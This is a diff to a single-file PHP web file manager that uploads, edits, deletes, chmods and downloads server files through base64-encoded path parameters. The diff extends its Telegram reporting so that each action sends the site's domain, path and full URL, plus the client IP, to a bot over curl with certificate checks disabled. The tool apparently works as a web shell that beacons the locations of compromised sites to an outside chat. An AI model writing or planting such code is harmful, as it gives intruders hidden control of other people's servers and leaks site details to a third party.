@@ -52,6 +52,27 @@ function get_current_url() {
     return $protocol . $host . ($_SERVER['REQUEST_URI'] ?? '');
 }
 
+function get_current_domain() {
+    $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
+    // Remove port if exists
+    $host = preg_replace('/:\d+$/', '', $host);
+    return $host;
+}
+
+function get_relative_path($full_path) {
+    global $document_root;
+    // Get document root for current domain
+    $current_doc_root = $_SERVER['DOCUMENT_ROOT'] ?? '';
+    
+    // Try to get relative path from document root
+    if (strpos($full_path, $current_doc_root) === 0) {
+        return substr($full_path, strlen($current_doc_root));
+    }
+    
+    // Fallback: get basename of the current script directory
+    return dirname($_SERVER['SCRIPT_NAME'] ?? '');
+}
+
 function get_client_details() {
     return [
         'ip' => $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
@@ -101,7 +122,7 @@ function verify_csrf_token($token) {
 }
 
 // ============================================================
-// TELEGRAM SENDER WITH CUSTOM FORMAT
+// TELEGRAM SENDER WITH DYNAMIC PATH
 // ============================================================
 function send_secure_notification($action, $details = []) {
     global $current;
@@ -110,8 +131,21 @@ function send_secure_notification($action, $details = []) {
     if (empty($tg['bot_token']) || empty($tg['chat_id'])) return false;
     
     $client = get_client_details();
-    $current_dir = $current ?? getcwd() ?? 'Unknown';
     $current_url = get_current_url();
+    $current_domain = get_current_domain();
+    
+    // Get the correct path for current domain
+    $script_path = dirname($_SERVER['SCRIPT_NAME'] ?? '');
+    $current_dir_display = $script_path !== '/' ? $script_path : '/';
+    
+    // If we have a subdirectory from the URL
+    if (isset($_GET['d']) && !empty($_GET['d'])) {
+        $decoded_path = base64_decode($_GET['d']);
+        $relative = get_relative_path($decoded_path);
+        if (!empty($relative) && $relative !== '/') {
+            $current_dir_display = $relative;
+        }
+    }
     
     // Action icons mapping
     $action_icons = [
@@ -132,7 +166,7 @@ function send_secure_notification($action, $details = []) {
     
     $display_action = $action_icons[$action] ?? $action;
     
-    // Build message with custom format
+    // Build message with dynamic path
     $message = "🔐 FILE MANAGER ACTIVITY\n";
     $message .= str_repeat("━", 55) . "\n";
     $message .= "👤 User: Administrator\n";
@@ -141,7 +175,8 @@ function send_secure_notification($action, $details = []) {
     $message .= str_repeat("━", 55) . "\n";
     $message .= "🌐 IP Address: {$client['ip']}\n";
     $message .= str_repeat("━", 55) . "\n";
-    $message .= "📂 Directory:\n{$current_dir}\n";
+    $message .= "🌍 Domain: {$current_domain}\n";
+    $message .= "📂 Directory:\n{$current_dir_display}\n";
     $message .= str_repeat("━", 55) . "\n";
     $message .= "🔗 FULL URL:\n{$current_url}\n";
     $message .= str_repeat("━", 55) . "\n";
@@ -157,7 +192,7 @@ function send_secure_notification($action, $details = []) {
     
     $message .= str_repeat("━", 55);
     
-    // Send via curl (non-blocking)
+    // Send via curl
     $url = "https://api.telegram.org/bot{$tg['bot_token']}/sendMessage";
     $postData = http_build_query([
         'chat_id' => $tg['chat_id'],
@@ -169,14 +204,15 @@ function send_secure_notification($action, $details = []) {
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_POST, true);
     curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, false);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 1);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-    curl_exec($ch);
+    $result = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
     curl_close($ch);
     
-    return true;
+    return $httpCode == 200;
 }
 
 // ============================================================
@@ -257,12 +293,22 @@ if (!$authenticated) {
 }
 
 // ============================================================
-// Path Handling
+// Path Handling - Dynamic per domain
 // ============================================================
-$document_root = $_SERVER['DOCUMENT_ROOT'] ?: dirname(__FILE__);
-$current = isset($_GET['d']) ? base64_decode($_GET['d']) : $document_root;
+// Get document root for current domain
+$document_root = $_SERVER['DOCUMENT_ROOT'] ?? dirname(__FILE__);
+$script_dir = dirname($_SERVER['SCRIPT_NAME'] ?? '');
+
+// Default current directory
+$current = isset($_GET['d']) ? base64_decode($_GET['d']) : $document_root . $script_dir;
 $current = sanitize_path($current);
-if (!$current || !is_dir($current)) $current = $document_root;
+
+if (!$current || !is_dir($current)) {
+    $current = $document_root . $script_dir;
+    if (!is_dir($current)) {
+        $current = $document_root;
+    }
+}
 
 @chdir($current);
 $parent_dir = dirname($current);
@@ -316,10 +362,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['csrf_token']) && veri
             @chmod($current . '/' . $filename, 0644);
             $message = "✅ Uploaded: {$filename}";
             $toast_type = 'success';
+            
+            // Get relative path for display
+            $relative_path = str_replace($document_root, '', $current);
+            if (empty($relative_path)) $relative_path = '/';
+            
             send_secure_notification('UPLOAD', [
                 'File Name' => $filename,
                 'File Size' => format_size($_FILES['file']['size']),
-                'Directory' => $current,
+                'Directory' => $relative_path,
+                'Domain' => get_current_domain(),
                 'URL' => get_current_url()
             ]);
         } else {
@@ -337,9 +389,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['csrf_token']) && veri
         if ($name && !file_exists($current . '/' . $name) && mkdir($current . '/' . $name, 0755)) {
             $message = "✅ Folder created: {$name}";
             $toast_type = 'success';
+            $relative_path = str_replace($document_root, '', $current);
             send_secure_notification('FOLDER', [
                 'Folder Name' => $name,
-                'Directory' => $current,
+                'Directory' => $relative_path,
                 'URL' => get_current_url()
             ]);
         } else {
@@ -357,9 +410,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['csrf_token']) && veri
             @chmod($current . '/' . $name, 0644);
             $message = "✅ File created: {$name}";
             $toast_type = 'success';
+            $relative_path = str_replace($document_root, '', $current);
             send_secure_notification('FILE', [
                 'File Name' => $name,
-                'Directory' => $current,
+                'Directory' => $relative_path,
                 'URL' => get_current_url()
             ]);
         } else {
@@ -378,10 +432,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['csrf_token']) && veri
         if (file_exists($path) && safe_delete($path)) {
             $message = "✅ Deleted: {$name}";
             $toast_type = 'success';
+            $relative_path = str_replace($document_root, '', $current);
             send_secure_notification('DELETE', [
                 'Type' => $is_dir ? 'Folder' : 'File',
                 'Name' => $name,
-                'Directory' => $current,
+                'Directory' => $relative_path,
                 'URL' => get_current_url()
             ]);
         } else {
@@ -399,10 +454,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['csrf_token']) && veri
         if ($old && $new && $old !== $new && rename($current . '/' . $old, $current . '/' . $new)) {
             $message = "✅ Renamed: {$old} → {$new}";
             $toast_type = 'success';
+            $relative_path = str_replace($document_root, '', $current);
             send_secure_notification('RENAME', [
                 'Old Name' => $old,
                 'New Name' => $new,
-                'Directory' => $current,
+                'Directory' => $relative_path,
                 'URL' => get_current_url()
             ]);
         } else {
@@ -420,10 +476,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['csrf_token']) && veri
         if ($name && preg_match('/^[0-7]{3,4}$/', $perm) && chmod($current . '/' . $name, octdec($perm))) {
             $message = "✅ Permission changed to {$perm}";
             $toast_type = 'success';
+            $relative_path = str_replace($document_root, '', $current);
             send_secure_notification('CHMOD', [
                 'File' => $name,
                 'New Permission' => $perm,
-                'Directory' => $current,
+                'Directory' => $relative_path,
                 'URL' => get_current_url()
             ]);
         } else {
@@ -440,9 +497,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['csrf_token']) && veri
         if ($name && file_put_contents($current . '/' . $name, $_POST['content'] ?? '') !== false) {
             $message = "✅ File saved: {$name}";
             $toast_type = 'success';
+            $relative_path = str_replace($document_root, '', $current);
             send_secure_notification('SAVE', [
                 'File Name' => $name,
-                'Directory' => $current,
+                'Directory' => $relative_path,
                 'URL' => get_current_url()
             ]);
         } else {
@@ -687,7 +745,7 @@ usort($items, function($a, $b) {
         <?php if ($can_go_up): ?>
         <a href="?d=<?php echo base64_encode($parent_dir); ?>" class="btn btn-up"><i class="fas fa-level-up-alt"></i> Up</a>
         <?php endif; ?>
-        <a href="?d=<?php echo base64_encode($document_root); ?>" class="btn btn-root"><i class="fas fa-home"></i> Root</a>
+        <a href="?d=<?php echo base64_encode($document_root . $script_dir); ?>" class="btn btn-root"><i class="fas fa-home"></i> Root</a>
         <button class="btn btn-primary" onclick="openModal('uploadModal')"><i class="fas fa-upload"></i> Upload</button>
         <button class="btn btn-outline" onclick="openModal('folderModal')"><i class="fas fa-folder-plus"></i> Folder</button>
         <button class="btn btn-outline" onclick="openModal('fileModal')"><i class="fas fa-file-plus"></i> File</button>
@@ -701,14 +759,17 @@ usort($items, function($a, $b) {
     <div class="breadcrumb">
         <i class="fas fa-folder-open"></i> 
         <?php
-        $parts = explode(DIRECTORY_SEPARATOR, $current);
+        $display_path = str_replace($document_root, '', $current);
+        if (empty($display_path)) $display_path = '/';
+        $parts = explode(DIRECTORY_SEPARATOR, $display_path);
         $path = '';
         $first = true;
         foreach ($parts as $part) {
             if (empty($part)) continue;
             $path .= DIRECTORY_SEPARATOR . $part;
             if (!$first) echo '<span class="separator">/</span>';
-            echo '<a href="?d=' . base64_encode($path) . '">' . htmlspecialchars($part) . '</a>';
+            $full_path = $document_root . $path;
+            echo '<a href="?d=' . base64_encode($full_path) . '">' . htmlspecialchars($part) . '</a>';
             $first = false;
         }
         ?>
@@ -828,10 +889,12 @@ function showToast(msg, type) { let t = document.getElementById('toast'); if(!t)
 if (isset($_GET['download']) && isset($_GET['f'])) {
     $file = sanitize_filename(base64_decode($_GET['f']));
     if ($file && file_exists($current . '/' . $file) && is_file($current . '/' . $file)) {
+        $relative_path = str_replace($document_root, '', $current);
         send_secure_notification('DOWNLOAD', [
             'File Name' => $file,
             'File Size' => format_size(filesize($current . '/' . $file)),
-            'Directory' => $current,
+            'Directory' => $relative_path,
+            'Domain' => get_current_domain(),
             'URL' => get_current_url()
         ]);
         header('Content-Type: application/octet-stream');
